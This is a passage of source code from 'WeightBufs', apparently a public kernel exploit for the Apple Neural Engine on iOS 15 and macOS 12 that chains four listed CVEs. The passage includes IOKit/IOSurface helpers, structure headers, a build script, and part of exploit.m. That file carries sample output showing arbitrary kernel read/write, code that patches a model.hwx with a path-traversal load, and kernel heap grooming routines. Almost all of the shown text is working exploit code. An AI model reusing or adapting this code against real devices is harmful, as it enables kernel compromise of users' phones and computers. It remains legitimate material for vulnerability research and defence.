        binary[cur++]  = (kOSSerializeEndCollection | kOSSerializeSymbol | 5); // key
        binary[cur++]  = key;
        binary[cur++]  = 0;
        return cur;
}

void set_indexed_timestamp(io_connect_t c,uint32_t surface_id,uint64_t index,uint64_t value)
{
        uint64_t args[3] = {0};
        args[0] = surface_id;
        args[1] = index;
        args[2] = value;
        kern_return_t kr = IOConnectCallMethod(c, 33, args,3,
                                               NULL, 0,
                                               NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "set_indexed_timestamp");
}

kern_return_t iosurface_get_use_count(io_connect_t c,uint32_t surface_id,uint32_t *output)
{
        uint64_t args[1] = {0};
        args[0] = surface_id;
        uint32_t outsize = 1;
        uint64_t out = 0;

        kern_return_t kr = IOConnectCallMethod(c, 16, args,1,
                                               NULL, 0,
                                               &out, &outsize, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_get_use_count");
        *output = (uint32_t)out;
        return kr;
}

```

`exploit/IOSurface.h`:

```h
#ifndef H_IOSURFACE_H
#define H_IOSURFACE_H

#include "iokit.h"
#include <IOSurface/IOSurfaceRef.h>

#define IOSurfaceLockResultSize 0xF60

#define kOSSerializeBinarySignature        0x000000D3
#define kOSSerializeIndexedBinarySignature 0x000000D4

typedef struct IOSurfaceFastCreateArgs
{
        uint64_t IOSurfaceAddress;
        uint32_t IOSurfaceWidth;
        uint32_t IOSurfaceHeight;
        uint32_t IOSurfacePixelFormat;
        uint32_t IOSurfaceBytesPerElement;
        uint32_t IOSurfaceBytesPerRow;
        uint32_t IOSurfaceAllocSize;
} IOSurfaceFastCreateArgs;


io_connect_t get_surface_client(void);
io_connect_t release_surface(io_connect_t surface,uint32_t surface_id);
io_connect_t create_surface_fast_path(io_connect_t surface,uint32_t *surface_id,IOSurfaceFastCreateArgs *args);
void set_indexed_timestamp(io_connect_t c,uint32_t surface_id,uint64_t index,uint64_t value);
kern_return_t iosurface_get_use_count(io_connect_t c,uint32_t surface_id,uint32_t *output);
void iosurface_remove_property(io_connect_t ,uint32_t ,uint32_t );

typedef uint64_t u64;

mach_port_t iosurface_create_shared_event(io_connect_t c);
kern_return_t iosurface_signal_shared_event(io_connect_t c,mach_port_t sharedRefId, uint64_t signal);
kern_return_t iosurface_query_shared_event(io_connect_t c,mach_port_t sharedRefId);
kern_return_t iosurface_notify_shared_event(io_connect_t c,mach_port_t sharedRefId,
                                            uint64_t arg1,
                                            uint64_t arg2,
                                            uint64_t arg3,
                                            uint64_t arg4);


void add_shared_event_notification_port(io_connect_t c,mach_port_t port,uint64_t *references);
void notify_shared_event(io_connect_t ,u64 , u64 , u64 ,u64 ,u64 );
void iosurface_set_value(io_connect_t ,uint32_t );
void * init_iosurface_prop_data(void);
uint32_t build_iosurface_payload(uint32_t count,uint8_t *data,uint32_t datasize,uint32_t key);
uint32_t build_surface_payload_with_string(uint32_t count,char *string,uint32_t stringsize,uint32_t key);


#endif  /* H_IOSURFACE_H */

```

`exploit/aneProgram.h`:

```h
#ifndef H_ANEPROGRAM_H
#define H_ANEPROGRAM_H

#include <stdio.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach-o/loader.h>

typedef unsigned int ZinComputeProgramStatus;
struct ZinComputeProgramInitInfo;
struct ZinComputeProgramStruct;
struct ZinComputeProgramSection;
typedef struct ZinComputeProgramStruct ZinComputeProgram;

typedef uint64_t u64;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint8_t u8;

#define FOR_EACH_COMMAND                                                \
        lc = (load_command*)(mh + 1);                                   \
        for (int i = 0; i < mh->ncmds; ++i, lc = (load_command*)((char*)lc + lc->cmdsize))


CFMutableDictionaryRef ANECCreateModelDictionary(void *, size_t);
ZinComputeProgramStatus  ZinComputeProgramUpdateMutables(uint32_t,void *,void *, size_t,void *,size_t);

ZinComputeProgramStatus ZinComputeProgramMakeInitInfo(
        const ZinComputeProgram *,
        struct ZinComputeProgramInitInfo **);

ZinComputeProgramStatus ZinComputeProgramMake(
        struct mach_header_64 *,
        size_t,
        struct ZinComputeProgramStruct **);

ZinComputeProgramStatus  ZinComputeProgramHasMutableOperation(
        struct ZinComputeProgramStruct *,
        boolean_t *);

ZinComputeProgramStatus __cdecl ZinComputeProgramGetInitSection(
        const ZinComputeProgram *program,
        struct ZinComputeProgramSection **SectionOut);

ZinComputeProgramStatus __cdecl ZinComputeProgramCompareCompilerVersion(const char *, const char *, int32_t *);

ZinComputeProgramStatus ZinComputeProgramGetNamesFromMultiPlaneLinear(struct load_command *,u32 *, u64*, u32 *,u64 *);

long ZinComputeProgramGetNamesFromMultiPlaneTiledCompressed(struct load_command *,u32 *,
                                                                       u64 *,
                                                                       u64 *,
                                                                       u64 *,
                                                                       u64 *);

struct ZinComputeProgramSectionInfo
{
        struct
        {
                int  bufferType;
                struct ZinComputeProgramSection *ComputeSgment;
        }infos;
};

ZinComputeProgramStatus ZinComputeGetProgramSections(ZinComputeProgram *,
                                            uint32_t *,
                                            struct ZinComputeProgramSectionInfo **);

struct ZinComputeProgramInitInfo
{
        uint64_t count_index;
        void* unk_ptr;
        uint64_t unk_ptr_size;
};


struct compute_thread_binding;
struct ZinComputeProgramBinding
{
        struct load_command *load_command;
        void *unk_thread_obj;
        struct compute_thread_binding *thread_binding;
};

struct ZinComputeProgramSymbol {int a;};

struct __attribute__((aligned(8))) ZinComputeProgramSection
{
        struct section_64 *MachSections;
        struct ZinComputeProgramSegment *ProgramSegments;
        struct relocation_entries *relocation_entries;
        char *sect_start_addrs;
        u64 field_20;
};

struct ZinComputeProgramProcedure
{
        char *procedureName;
        u64 proc_fvmlib_count;
        struct ZinComputeProgramFvmlib **fvmlib;
        u64 ProcedcureOperationsCount;
        struct ZinComputeProcedureOperation **ProcedcureOperations;
        u64 field_28;
        u64 ProgramBindingsCount;
        struct ZinComputeProgramBinding **ProgramBindings;
};


struct ZinComputeProcedureOperation {int a;};
struct ZinComputeProgramFvmlib {int a;};
struct ZinComputeProgramSegment {int a;};


struct ZinComputeProgramStruct
{
        struct mach_header_64 *CP_mach_header;
        u64 CP_version;
        struct ident_command *CP_lc_ident;
        struct note_command *CP_lc_note;
        struct source_version_command *CP_lc_source_version;
        u64 CP_ProgramSegments_Count;
        struct ZinComputeProgramSegment *CP_ProgramSegments;
        u64 CP_fixed_vm_dylib_count;
        struct ZinComputeProgramFvmlib *CP_ProgramFvmlib;
        u64 CP_ThreadProcedureOperationsCount;
        struct ZinComputeProcedureOperation *CP_ThreadProcedureOperations;
        u64 CP_ThreadProceduresCount;
        struct ZinComputeProgramProcedure *CP_ThreadProcedures;
        struct symtab_command *CP_ProgramSymbolTable;
        struct ZinComputeProgramSymbol *CP_ProgramSymbols;
        u64 CP_unk_78;
        u64 CP_ThreadBindingCount;
        struct ZinComputeProgramBinding *CP_ThreadBindings;
};

enum THREAD_FLAVORS
{
        THREAD_PROCEDURE_OPERATION = 0x1,
        THREAD_FLAVORS_2 = 0x2,
        THREAD_BINDING = 0x3,
        THREAD_PROCEDURE = 0x4,
};


union compute_thread_command_flavors
{
        u8 * procedure_operation; // ane_op_state ?
        u8 * ane_bind_state; // ane_bind_state
        u8 * seg_thread_state; // ane_seg_thread_state_64
};


struct compute_thread_command
{
        u32 cmd;
        u32 cmdsize;
        enum THREAD_FLAVORS flavor;
        int count;
        union compute_thread_command_flavors thread_states;
};

struct compute_thread_binding
{
        u32 binding_typeinfo;
        u32 kind;
        char data[0xD20];
};

struct relocation_info
{
        int32_t r_address;
        uint32_t r_symbolnum;
};

struct relocation_entries
{
        struct relocation_info *relocs;
        struct ZinComputeProgramSymbol *Symbols;
        struct ZinComputeProgramSection *compute_sect;
};



struct ANECMutableProcedureInfoHeader {
        u64 field_0;
        u64 field_8;
        u64 field_10;
        u32 weight_buffer_size;
        u32 unk_20;
};

struct ANECMutableProcedureInfo
{
        struct ANECMutableProcedureInfoHeader hdr;
        uint64_t wb_offsets[0];
};

struct opsInfo
{
        uint32_t op_index;
        uint32_t op_count;
        uint64_t op_offsets[0];
};

struct weightInfo {
        uint64_t wi_index;
        uint64_t wi_offset;
        uint64_t wi_size;
};


typedef struct  {
        mach_port_t eventPort;
        uint32_t eventType;
        uint64_t waitValue;
        uint64_t unknown;
        uint64_t _mIOSurfaceSharedEvent;
        uint64_t field_20;
} Events;

typedef struct {
        uint32_t numWaitEvents;
        uint32_t numSignalEvents;
        Events WaitEvents[0x40];
        Events SignalEvents[0x40];
} H11ANESharedEventsStruct;



#if 0
struct ZinComputeProgramStruct
{
        struct mach_header_64 *mach_header;
        u64 version;
        struct ident_command *ident_cmd;
        stryct note_command *lc_note;
        struct source_version_command *lc_source_version;
        u64 segment_count;
        void *segments;                                         /* ZinComputeProgramSegment *segments; */
        u64 fixed_vm_dylibs_count;
        void *fixed_vm_dylibs;                                  /* ZinComputeProgramFvmlib */
        u64 size;
        void *lc_procedure_operation;                           /* ZinComputeProcedureOperation */
        u64 procedure_count;
        void  *procedures;                                      /* ZinComputeProgramProcedure */
        struct symtab_command *ProgramSymbolTable;
        void *ProgramSymbols;                                   /* ZinComputeProgramSymbol */
        u64 unk_78;
        u64 ProgramBindingCount;
        void *ProgramBinding;                                   /* ZinComputeProgramBinding */
};
#endif


struct OcgRasterizationInfoStruct
{
        u16 vals[4];
};

typedef struct
{
        u64 read_count;                             /* How many bytes I'd like to read ? */
        u64 read_offset;                            /* At which offset I should start reading data ?  */
        u64 global_chunk_size;
        u32 chunk_index;                            /* DeCxt::FileIndexToWeight() OOB Read due to lack of array index validation */
        u64 underflow;                              /* DeCxt::RasterizeScaleBiasData() OOB writes due to integer overflow vulnerability */
        struct OcgRasterizationInfoStruct ocg;
}serializer_info_t;


#endif  /* H_ANEPROGRAM_H */

```

`exploit/build_macos.sh`:

```sh
clang -o exploit *.c *.m  -framework IOKit -framework CoreFoundation \
      -framework IOSurface -F /System/Library/PrivateFrameworks \
      -framework AppleNeuralEngine -framework CoreML \
      -framework Foundation -ObjC

```

`exploit/exploit.h`:

```h
#ifndef H_EXPLOIT_H
#define H_EXPLOIT_H

//#define dbg printf
#define dbg(x, ...)


#include "iokit.h"
#include "IOSurface.h"
#include "IOGPU.h"
#include "ANEDirectIn.h"
#include "aneProgram.h"
#include <sys/utsname.h>
#include <Foundation/Foundation.h>
#include "AppleNeuralEngine/_ANEModel.h"
#include "AppleNeuralEngine/_ANEClient.h"

#define FOR_EACH_COMMAND                                                \
        lc = (struct load_command*)(mh + 1);                                   \
        for (int i = 0; i < mh->ncmds; ++i, lc = (struct load_command*)((char*)lc + lc->cmdsize))

#if TARGET_OS_OSX
#define xpacd(addr)  ((addr) | ((uint64_t)0xfffffe00 << 32))
#else
#define xpacd(addr)  ((addr) | ((uint64_t)0xfffffff0 << 32))
#endif

#define TOTAL_PORTS 0x1300


#if TARGET_OS_OSX

#define MAX_PROGRAMS            5
#define IOSURFACE_OBJ_SIZE      0x440
#define MAX_SHMEMS              0x2000

#else

#define MAX_PROGRAMS            5
#define IOSURFACE_OBJ_SIZE      0x430
#define MAX_SHMEMS              0x2000

#endif  /* TARGET_OS_OSX */

#define MAX_TRIES               0x10

struct exploit {

        u8 * initInfo;                       /* INIT:__text 'initInfo' section, where serialized data is located */
        u32 initInfo_sz;                    // The size of the allocated section

        io_connect_t iosurface;
        u32 weightsSurface;

        u8 * weightsBuffer;          // weight surface buffer
        size_t weightsBufferSize;       // weight surface size

        u32 InOutSurface;
        u32 groom_surface_count;

        u32 groom_pageable_maps_count;
        struct shmem *shmems[MAX_SHMEMS * MAX_TRIES];
        u32 shmems_count;

        u32 groom_kernel_map_count;
        bool kernel_map_groom_done;

        void *mh;
        size_t mh_size;
};


struct H11ANESharedMemorySurfaceParamsStruct {
        size_t size;
        u64 p_IOSurface;
        u64 dartMapBase;
        u64 surface_memDesc;
        u64 surface_memMap;
        u64 surface_address;
        u64 dmaCommand;
        u32 name;
        u32 unkown32;
        u64 unkown64;
};

struct matched_surface {
        u32 surface_id;
        u8 * loc;
        u64 IOSurfaceClient_loc;
        u64 IOSurface_loc;
};


struct kern_rw
{
        u8 * shm_uaddr;
        u64 shm_kaddr;
        u64 shm_size;
        u32 surface_id;
        u32 shm_id;
};

void init_structs(void);
void groom_pageable_maps_with_iogpu_cmdbufs(void);
mach_port_t sr(void);
void hwx_init_frameworks(void);
void hwx_patch_model(void);
void _hwx_patch_model(struct mach_header_64 *,size_t ,u8 ** );
uint64_t hwx_load_model(void);
uint64_t hwx_patch_and_load_model(void);
void hwx_unload_model(u64);


int exploit(void);

#endif  /* H_EXPLOIT_H */

```

`exploit/exploit.m`:

```m
/*
 * WeightBufs : Apple Neural Engine (ANE) kernel exploit for iOS 15/macOS 12
 * Vulns && Exploit by @_simo36
 *
 * - Bugs :
 * CVE-2022-32845 : aned signature check bypass for model.hwx.
 * CVE-2022-32948 : DeCxt::FileIndexToWeight() OOB Read due to lack of array index validation
 * CVE-2022-42805 : ZinComputeProgramUpdateMutables() potential arbitrary read due to Integer overflow issue
 * CVE-2022-32899 : DeCxt::RasterizeScaleBiasData() OOB writes due to integer underflow vulnerability
 *
 * - Tested on :
 * iPhone12 Pro (iPhone13,3) with iOS 15.5
 * iPad Pro (iPad8,10) with iPadOS 15.5
 * iPhone11 Pro (iPhone12,3) with iOS 15.4.1
 * MacBookAir10,1 M1 with macOS 12.4

 [+] Loading AppleNeuralEngine framework ...OK
 [+] Patching model.hwx with custom initInfo section ... OK
 [+] Stage 1: Grooming kernel memory ...
 [+] Grooming IOSurface_zone ... OK
 [+] Grooming pageable maps ... OK
 [+] Grooming kernel_map ... . . . . . OK
 [+] Patching model.hwx with custom initInfo section ... OK
 [+] Found scratched ShmemID 0x1f6b with size 0x4000
 00 40 00 00 00 00 00 00  E0 A9 E6 9F E4 FF FF FF  |  .@..............
 00 00 B4 02 00 00 00 00  68 6C 55 CF E2 FF FF FF  |  ........hlU.....
 E0 F2 51 CF E2 FF FF FF  00 40 1B FF EF FF FF FF  |  ..Q......@......
 38 04 E8 66 E6 FF FF FF  4B 54 55 4D 01 00 00 00  |  8..f....KTUM....
 00 00 00 00 00 00 00 00                           |  ........
 [+] Leaked mutable kernel section (MUTK) buffer 0xffffffefff1b4000
 [+] Leaked IOSurface object 0xffffffe49fe6a9e0
 [+] Kernel location of our input buffer 0xffffffefff074000
 [+] Stage 3: Dumping a memory page from IOSurface_zone
 [+] Patching model.hwx with custom initInfo section ... OK
 [+] Found scratched ShmemID 0x1fb8 with size 0x4000
 [+] Found a matching surface-id=0x018f IOSurface=0xffffffe49fe68000 !
 [+] Found a matching surface-id=0x0195 IOSurface=0xffffffe49fe68430 !
 [+] Found a matching surface-id=0x0191 IOSurface=0xffffffe49fe69d50 !
 [+] Found a matching surface-id=0x0192 IOSurface=0xffffffe49fe6a180 !
 [+] Found a matching surface-id=0x0194 IOSurface=0xffffffe49fe6b240 !
 [+] Found a matching surface-id=0x018e IOSurface=0xffffffe49fe6baa0 !
 [+] IOSurfaceClient location 0xffffffe666eeab20
 [+] IOSurface location 0xffffffe49fe6baa0
 [+] IOSurfaceRoot 0xffffffe2ce25e000
 [+] Stage 4: Performing the arbitrary write primitive ...
 [+] Patching model.hwx with custom initInfo section ... OK
 [+] Got shmem id 0x1fb8 for 0xffffffefff074000
 [+] Stage 5: Get stable arbitrary kernel read/write .... OK
 [+] IOSurfaceRoot vtable 0xfffffff018456db0
 [+] kread64([0xfffffff018456db0]) = 0x39bbc170194012f4
 [+] kread64([0xffffffefff077000]) = 0x4141414100003000
 [+] kwrite64(0xffffffefff077000,0xdeadbeef12345678)
 [+] kread64([0xffffffefff077000]) = 0xdeadbeef12345678
 [+] Kernel text base 0xfffffff017bb8000
 CF FA ED FE 0C 00 00 01  02 00 00 C0 02 00 00 00  |  ................
 1A 00 00 00 90 16 00 00  01 00 20 00 00 00 00 00  |  .......... .....
 19 00 00 00 C8 02 00 00  5F 5F 54 45 58 54 00 00  |  ........__TEXT..
 00 00 00 00 00 00 00 00  00 80 BB 17 F0 FF FF FF  |  ................
 00 40 6F 00 00 00 00 00  00 00 00 00 00 00 00 00  |  .@o.............
 00 40 6F 00 00 00 00 00  05 00 00 00 05 00 00 00  |  .@o.............
 08 00 00 00 00 00 00 00  5F 5F 63 6F 6E 73 74 00  |  ........__const.
 [+] Cleanup done
 system name = Darwin
 node name   = iPhone12-Pro
 release     = 21.5.0
 version     = Darwin Kernel Version 21.5.0: Thu Apr 21 21:51:27 PDT 2022; root:xnu-8020.122.1~1/RELEASE_ARM64_T8101
 machine     = iPhone13,3


*/


#include "exploit.h"


struct exploit *p = NULL;

serializer_info_t *sinfo = NULL;
io_connect_t client = IO_OBJECT_NULL, surface_client = IO_OBJECT_NULL;


struct H11ANESharedMemorySurfaceParamsStruct aneMemSurface = {};

H11ANESharedEventsStruct *events = NULL;

extern uint32_t * prop_data;

struct kern_rw krw = {};

IOSurfaceID g_IOSurfaceIds[0x4000];
u32 g_IOSurfaceIds_count;
struct matched_surface matched = {};


u64 IOSurfaceRoot = 0;
u64 self_task = 0;
u64 IOSurface_zone_page = 0;
#define store_surface_id(id)                            \
        assert(g_IOSurfaceIds_count < 0x4000);          \
        g_IOSurfaceIds[g_IOSurfaceIds_count++] = (id)


#if TARGET_OS_OSX
_ANEModel * md = nil;
_ANEClient * anec  = nil;

#else   /* iOS/iPadOS  */

id  md = nil;
id  anec  = nil;

#define _ANEModel __ANEModel
#define _ANEClient __ANEClient
Class __ANEModel;
Class __ANEClient;
char *gBundle = NULL;


void hwx_init_frameworks(void)
{
        printf("[+] Loading AppleNeuralEngine framework ...");
        __ANEModel = NSClassFromString(@"_ANEModel");
        __ANEClient = NSClassFromString(@"_ANEClient");

        size_t size = 0x1000;
        char *bundle_path = (char *)calloc(1,size);
        CFBundleRef bundle = CFBundleGetMainBundle();
        CFURLRef url = CFBundleCopyBundleURL(bundle);
        CFURLGetFileSystemRepresentation(url, true, (UInt8 *)bundle_path, size);

        //CFURLGetFileSystemRepresentation(CFBundleCopyBundleURL(CFBundleGetMainBundle()), true, (UInt8 *)bundle_path, 0x1000);
        CFRelease(url);
        //printf("%s \n",bundle_path);
        gBundle = bundle_path;
        printf("OK\n");
}

#endif

void hwx_patch_model(void)
{
        printf("[+] Patching model.hwx with custom initInfo section ... ");
        size_t mh_size = 0;

#if TARGET_OS_OSX
        if(!p->mh)
                p->mh = load_file("model_tmp.hwx",&mh_size);

        /* void *mh = load_file("model_tmp.hwx",&mh_size); */

        struct mach_header_64 * mutable_mh = (struct mach_header_64 *)calloc(1,p->mh_size+0x10000);
        memcpy((void *)mutable_mh,(void *)p->mh,p->mh_size);

        u8* initInfo = NULL;
        _hwx_patch_model(mutable_mh,p->mh_size,&initInfo);
        assert(initInfo);

        memcpy(initInfo,p->initInfo,p->initInfo_sz);
        int fd = open("/var/tmp/model.hwx",O_RDWR|O_CREAT, 0777);
        assert(fd != -1);

        p->mh_size+=0x10000;
        ssize_t rb = write(fd,mutable_mh,p->mh_size);
        assert(rb == p->mh_size);
        close(fd);


#else
        gBundle[strlen(gBundle)] = '/';

        char *tmp_model = "model_tmp.hwx";
        char *mfile = (char*)calloc(strlen(gBundle) + strlen(tmp_model),1);
        assert(mfile);
        memcpy(mfile,gBundle,strlen(gBundle));
        memcpy(mfile+strlen(gBundle),tmp_model,strlen(tmp_model));

        if(!p->mh)
                p->mh = load_file(mfile,&p->mh_size);

        const char *model_path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"model.hwx"].cString;// s.cString;
        int fd = open(model_path,O_RDWR|O_CREAT, 0644);
        if(fd == -1) {
                perror("open");
                exit(0);
        }

        struct mach_header_64 * mutable_mh = (struct mach_header_64 *)calloc(1,p->mh_size+0x10000);
        memcpy((void *)mutable_mh,(void *)p->mh,p->mh_size);

        u8* initInfo = NULL;
        _hwx_patch_model(mutable_mh,mh_size,&initInfo);
        assert(initInfo);

        memcpy(initInfo,p->initInfo,p->initInfo_sz);
        p->mh_size+=0x10000;
        ssize_t rb = write(fd,mutable_mh,p->mh_size);
        assert(rb == p->mh_size);
        close(fd);

#endif                         /* TARGET_OS_OSX */

        printf("OK\n");
}


uint64_t hwx_load_model(void)
{
        dbg("[+] Loading model.hwx  .. ");
#if TARGET_OS_OSX
        NSString  * model_str = @"/var/";
        NSString  * model_str2 = @"../../../../../../../../../../../../var/tmp/";
#else
        NSString  * model_str = NSTemporaryDirectory();

        char bundle_path_traversal[0x2000] = {0};
        snprintf(bundle_path_traversal,0x2000,"../../../../../../../../../../../../../%s",
                 NSTemporaryDirectory().cString );
        NSString *model_str2 = [NSString stringWithCString:bundle_path_traversal encoding:NSUTF8StringEncoding];
#endif
        NSError * err;

        NSURL  * model_url = [NSURL URLWithString: model_str];
        md = [_ANEModel modelAtURL:model_url key:@""];
        anec  = [_ANEClient sharedConnection];
        NSDictionary *opts = [NSMutableDictionary dictionary];

        [opts setValue:model_str forKey:@"kANEFIsInMemoryModelTypeKey"];
        [anec loadModel:md options:opts qos:2 error:&err];
        [opts setValue:@YES forKey:@"kANEFInMemoryModelIsCachedKey"];
        [opts setValue:model_str2 forKey:@"kANEFIsInMemoryModelTypeKey"];
        [anec loadModel:md options:opts qos:1 error:&err];


        if([md programHandle])
                dbg("OK\n");
        else {
                /* In terminal : 'idevicesyslog -u UDID --debug --match AppleH11ANEInterface' */
                /* if your see "Macho is not build", it means you've to guess the macho->cpu */
                printf("FAIL\n");
                printf("[-] Unable to load model.hwx. First make sure the macho->cpusubtype is correct. \n"
                       "\tIf so, type 'idevicesyslog -u UDID --debug --match AppleH11ANEInterface' to figure out the error\n");
                exit(0);
        }
        return [md programHandle];

}

 /* TODO : use program_handle arg */
void hwx_unload_model(u64 /* unused */ program_handle)
{
        dbg("[+] Unload program ... ");
        NSError *err = nil;
        NSDictionary *opts = [NSMutableDictionary dictionary];
        [anec purgeCompiledModel:md];
        [anec unloadModel:md options:opts qos:1 error:&err];
        dbg("OK\n");
}

uint64_t hwx_patch_and_load_model(void)
{
        hwx_patch_model();

        return hwx_load_model();
}

H11ANESharedEventsStruct * prepare_SignalWaitEvents(uint32_t numWaits, uint32_t numSignals,io_connect_t *surface_client)
{
        assert((numWaits <= 0x40) && (numSignals <= 0x40));
        H11ANESharedEventsStruct * SharedEvents = (H11ANESharedEventsStruct*)calloc(0x1408,1);
        assert(SharedEvents != NULL);

        SharedEvents->numWaitEvents = numWaits;
        SharedEvents->numSignalEvents = numSignals;
        mach_port_t shared_event = iosurface_create_shared_event(p->iosurface);

        for(int i=0; i < numWaits; i++) {
                SharedEvents->WaitEvents[i].eventPort = shared_event;
                SharedEvents->WaitEvents[i].waitValue = 0x41414141;

        }

        for(int i=0; i < numSignals; i++) {
                SharedEvents->SignalEvents[i].eventPort = shared_event;
                SharedEvents->SignalEvents[i].waitValue = 0x41414141;
                SharedEvents->SignalEvents[i].eventType = 2;

        }

        if(surface_client != NULL) *surface_client = p->iosurface;

        return SharedEvents;
}

void signal_wait_event(H11ANESharedEventsStruct *ev,uint32_t index,u64 waitValue)
{
        if(index == -1) {
                for(int i=0; i < ev->numWaitEvents; i++)

                        iosurface_signal_shared_event(surface_client,
                                                      ev->WaitEvents[i].eventPort,
                                                      waitValue + i);
                return;
        }
        assert(index < ev->numWaitEvents);
        iosurface_signal_shared_event(surface_client,
                                      ev->WaitEvents[index].eventPort,
                                      waitValue + index);
}

H11ANEProgramRequestArgsStruct * prepare_sendRequest(H11ANESharedEventsStruct *ev,
                                                     u64 program_handle)
{
        H11ANEProgramRequestArgsStruct * rq = (H11ANEProgramRequestArgsStruct *)calloc(0xA60,1);

        rq->programHandle = program_handle;

        rq->total_InputBuffers = 2;
        rq->inputBufferSurfaceId[0] = p->InOutSurface;
        rq->inputBufferSurfaceId[1] = p->InOutSurface;
        rq->inputBufferSymbolIndex[0] = 0;
        rq->inputBufferSymbolIndex[1] = 1;

        rq->weightsBufferSurfaceId  = p->weightsSurface;

        rq->total_OutputBuffers = 1;
        rq->outputBufferSurfaceId[0] = p->InOutSurface;

        rq->EventsAddr = (u64)ev;

        return rq;
}

void do_open_ane_device(u64 program_handle)
{
        client = iokit_get_connection("H11ANEIn",1);
        struct H11ANEDeviceInfoStruct din = {0};

        din.fields[0] = program_handle;
        din.fields[1] = 0x414141414141;
        *(uint32_t *)((char*)&din + 0x20) = 0x111;
        *(uint32_t *)((char*)&din + 0x30) = 0x222;

        do__ANEDriect_DeviceOpen(client,&din);
}

bool dev_open = false;
kern_return_t do_send_ane_request(u64 program_handle)
{
        if(dev_open == false) {
                do_open_ane_device(program_handle);
                dev_open = true;
        }

        H11ANEProgramRequestArgsStruct * request = prepare_sendRequest(events,0);
        if(!events)
                events = prepare_SignalWaitEvents(0,0,&surface_client);

        request->programHandle = program_handle;
        mach_port_t async = sr();
        kern_return_t kr = do__ANEDirect_ProgramSendRequest(client,async,request);
        if(kr == 0xe00002be) {
                IOServiceClose(client);
                client = IO_OBJECT_NULL;
                dev_open = false;
                printf("SendRequest failed ... \n");
        }

        free(request);
        mach_port_deallocate(mach_task_self(),async);
        return kr;
}

mach_port_t sr(void)
{
        mach_port_t p = MACH_PORT_NULL;
        kern_return_t kr = _kernelrpc_mach_port_allocate_trap(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        assert(kr == KERN_SUCCESS);
        kr = _kernelrpc_mach_port_insert_right_trap(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
        assert(kr == KERN_SUCCESS);
        return p;
}

/*
 * I want IOSurface_zone to gather few pages before spraying kernel_map
 * and IOKit pageable maps. Then release some IOSurface objects to create
 * holes for IOSurface allocations that the neural engine driver will make soon.
 * As a result, they could fall between our newly created IOSurface objects.
 * The intentions behind this are:
 * 1- Ensure that IOSurface zone does not request additional pages in the future.
 * 2- I want to leak a memory page from IOSurface zone that contains at least one IOSurface object created by our exploit. This is an important step toward the kernel r/w primitive.
 */
void groom_IOSurface_zone(void)
{
        printf("[+] Grooming IOSurface_zone ... ");
        IOSurfaceID released[0x10] = {};
        u32 release_count = 0;

         /* Fill IOSurface_zone with bunch of IOSurface allocations */
        /* for(int i =0; i < 0x200; i+=1) { */
        for(int i =0; i < p->groom_surface_count; i++) {
                u32 ssid = 0;
                IOSurfaceFastCreateArgs args = {0};
                args.IOSurfaceAddress = 0;
                args.IOSurfaceAllocSize =  0x4000;
                create_surface_fast_path(p->iosurface, &ssid, &args);

                /* if( ((i & 0x10) == 0) && (i > 5) && (release_count < 10)) */
                /* For each page, release one IOSurface object */
                if( ((i & 0x10) == 0) && (i > 5) && (release_count < 5))
                        released[release_count++] = ssid;
                else
                        store_surface_id(ssid);
        }

        for(int i=0; i < release_count;i++) {
                release_surface(p->iosurface,released[i]);
        }

        printf("OK\n");
}

/*
 * I want to fill gIOKitPageableSpace's first sub-map.
 * As a result, when the next submap is assigned, its address range will (hopefully) be at a higher location.
 * This is however not guaranteed due to the kernel_map randomization.
 */
static void groom_pageable_maps(void)
{
        printf("[+] Grooming pageable maps ... ");
#if TARGET_OS_OSX
        io_connect_t c =iokit_get_connection("IOGPU",5);
#else
        io_connect_t c = iokit_get_connection("IOGPU",1);
#endif
        u32 q = 0;
        char input[1032] = {0};

        memset(input,0x41,0x400);
        * (uint32_t *)(input + 0x400) = 1 % 5;
        * (uint32_t *)(input + 0x404) = 1;

        struct IOGPUNotificationQueueData *n = do_s_create_notificationqueue(c);
        do_s_new_command_queue(c,&input,&q);

        do_s_set_command_queue_notification_queue(c,q,n->id);

        /* uint32_t count = MAX_SHMEMS - 1; */
        uint32_t count = p->groom_pageable_maps_count - 1;
        for(int i=0; i < count; i++) {
                struct shmem * shm = do_s_create_shmem(c,0x4000,1);;
                assert(!mlock(shm->shm_addr,shm->shm_len));
                p->shmems[p->shmems_count] = shm;
                p->shmems_count++;
        }

        IOGPUCommandQueueSubmitArgs_t *args = (IOGPUCommandQueueSubmitArgs_t *)calloc(0x28,1);
        args->hdr.count = 1;

        IOGPUCommandQueueSubmitArgs_Command_t *submit_args = &args->body[0];
        submit_args->notify_1 = 0x1111;
        submit_args->notify_2 = 0x2222;
        submit_args->shmid_1 = p->shmems[0]->shm_id;
        submit_args->shmid_2 = p->shmems[1]->shm_id;
        submit_args->shmid_3 = p->shmems[2]->shm_id;

        struct Shmem3 * shm3_data = (struct Shmem3 *)p->shmems[0]->shm_addr;

        struct IOGPUKernelCommand * cmd = (struct IOGPUKernelCommand * )p->shmems[1]->shm_addr;
        cmd->size = 8;
        cmd->type = 2;
        cmd->cmd.Cmd_0x2.sleep = 1;

        shm3_data->hdr.fieldC = 0x40000001;
        shm3_data->hdr.field0 = 0x42424242;
        shm3_data->off.kernelCommandStart = 0;
        shm3_data->off.kernelCommandEnd = sizeof(struct IOGPUKernelCommand) + 8;

        /* This is how pageable maps look like after spraying :                                     */
        /*   size=0x4000                                                                            */
        /*  <============>                                                                          */
        /* +--------------+--------------+--------------+-----+--------------+--------------------+ */
        /* | DeviceShmem1 | DeviceShmem2 | DeviceShmem3 | ... | DeviceShmemN |         ...        | */
        /* +--------------+--------------+--------------+-----+--------------+--------------------+ */
        /*  */
        for(int i = 0; i < (count -3); i+=3) {
                submit_args->shmid_1 = p->shmems[i]->shm_id;
                submit_args->shmid_2 = p->shmems[i+1]->shm_id;
                submit_args->shmid_3 = p->shmems[i+2]->shm_id;
                do_s_submit_command_buffers(c,q,(uint8_t*)args,0x28 + 8);
        }
        printf("OK\n");

}


struct shmem * lookup_scratched_shmem(u64 scratch,u32 size,u32 *offset)
{
        /* printf("[+] Call lookup_scratched_shmem() \n"); */
        for(u32 i=0; i < p->shmems_count;i++) {

